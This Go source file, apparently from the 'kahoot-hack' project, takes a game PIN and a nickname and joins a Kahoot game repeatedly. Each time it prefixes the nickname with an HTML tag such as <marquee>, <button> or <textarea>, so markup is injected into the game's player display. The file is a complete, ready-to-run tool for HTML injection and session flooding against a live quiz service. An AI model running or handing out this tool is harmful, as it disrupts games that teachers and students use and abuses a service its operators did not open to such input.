package main

import (
	"fmt"
	"os"
	"strconv"

	"github.com/unixpickle/kahoot-hack/kahoot"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintln(os.Stderr, "Usage: html <game pin> <nickname>")
		os.Exit(1)
	}
	gamePin, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, "invalid game pin:", os.Args[1])
		os.Exit(1)
	}
	nickname := os.Args[2]

	for _, prefix := range []string{"<h1>", "<u>", "<h2>", "<marquee>", "<button>",
		"<input>", "<pre>", "<textarea>"} {
		conn, err := kahoot.NewConn(gamePin)
		defer conn.Close()
		if err != nil {
			fmt.Fprintln(os.Stderr, "failed to connect:", err)
			os.Exit(1)
		}

		conn.Login(prefix + nickname)
	}
}
